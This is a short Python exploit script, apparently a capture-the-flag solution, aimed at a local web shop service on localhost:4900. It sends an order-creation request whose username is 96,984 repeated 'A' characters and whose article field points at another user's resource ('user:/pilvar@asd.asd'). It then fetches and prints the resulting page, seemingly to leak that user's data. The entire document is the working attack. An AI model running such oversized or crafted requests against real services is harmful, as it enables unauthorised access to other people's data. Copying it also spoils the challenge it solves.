#!/usr/bin/env python3
from pwn import *
import sys

import requests
import http.client
import time

url = 'http://localhost:4900'
if len(sys.argv) >= 3 and sys.argv[1] == "--connection-info":
    url = sys.argv[2]

http.client._MAXLINE = 150000

res = requests.post(url + "/order/create", data={"username":"A"*96984,"email":"asd@asd.asd","address":"asd","quantity":"1","article":"user:/pilvar@asd.asd"})

time.sleep(2) #Might have to make this higher in case there's a queue

r = requests.get(res.url)

print(r.text)
